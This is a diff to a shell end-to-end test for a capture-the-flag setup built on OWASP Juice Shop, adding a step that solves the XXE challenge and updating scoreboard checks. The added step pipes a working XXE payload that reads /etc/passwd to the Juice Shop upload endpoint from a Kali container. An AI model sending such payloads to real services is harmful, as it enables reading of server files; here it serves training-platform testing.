@@ -21,6 +21,8 @@
 #              the join and the solve arrive
 #   remove     admin removes VM 3's student: the VM forgets by itself
 #   clear      admin clears game B: VM 2 forgets by itself; A is untouched
+#   unsafe     XXE, which Juice Shop disables in Docker unless its safety
+#              mode is off, solved from Kali 1 and counted on board A
 #   flags      the honest play above raised NO flag ...
 #   copy       ... and a copy of VM 1, made after it joined, is flagged
 #
@@ -265,6 +267,13 @@ wait_for 40 "VM 2 forgot by itself" shows 2 "Join the CTF"
 board_is game-a "Anna=200" || fail "clearing B touched A: $(board game-a)"
 ok "game A untouched"
 
+step "a challenge Juice Shop disables in Docker"
+# XXE Data Access, only there with Juice Shop's safety mode off. The one
+# upload also solves Deprecated Interface (2★) and Error Handling (1★).
+printf '<?xml version="1.0"?>\n<!DOCTYPE c [<!ENTITY x SYSTEM "file:///etc/passwd">]>\n<c>&x;</c>\n' |
+    kali 1 -o /dev/null -F "file=@-;filename=complaint.xml;type=text/xml" http://vm1/juiceshop/file-upload
+wait_for 40 "board A: Anna 200 + 450 + 250 + 100" board_is game-a "Anna=1000"
+
 step "no false flags"
 f="$(flags)"
 [ -z "$f" ] || fail "honest play raised flags: $f"
@@ -280,7 +289,7 @@ docker run -d --name "$PROJECT-copy" --network "${PROJECT}_uplink" -v "${PROJECT
     --cap-drop ALL --cap-add SETUID --cap-add SETGID --security-opt no-new-privileges juiceshop-ctf:latest >/dev/null
 wait_for 120 "the copy is flagged: one token, two Juice Shop boots" copied
 [ "$(flags | wc -l)" = 1 ] || fail "more than the one expected flag: $(flags)"
-board_is game-a "Anna=200" || fail "the copy changed the score: $(board game-a)"
+board_is game-a "Anna=1000" || fail "the copy changed the score: $(board game-a)"
 
 echo
 echo "ALL PASSED"
